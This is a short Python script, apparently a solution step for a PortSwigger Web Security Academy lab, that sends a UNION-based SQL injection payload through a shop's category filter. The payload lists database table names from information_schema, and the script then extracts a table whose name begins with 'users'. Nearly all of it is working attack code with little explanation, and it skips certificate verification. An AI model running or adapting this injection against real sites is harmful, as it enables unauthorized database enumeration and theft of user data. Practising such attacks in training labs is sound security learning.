import requests
from bs4 import BeautifulSoup
import re

site = '0acc003004c12030d0bac91a00060023.web-security-academy.net'
s = requests.Session()

# Step 2: Find the user table
url = f'https://{site}/filter?category=Gifts%27%20UNION%20SELECT%20table_name,null%20FROM%20information_schema.tables--+'
resp = s.get(url, verify=False)

soup = BeautifulSoup(resp.text, 'html.parser')
user_table = soup.find('table').find('th', string=re.compile('^users')).text
print(f"Found user table: {user_table}")
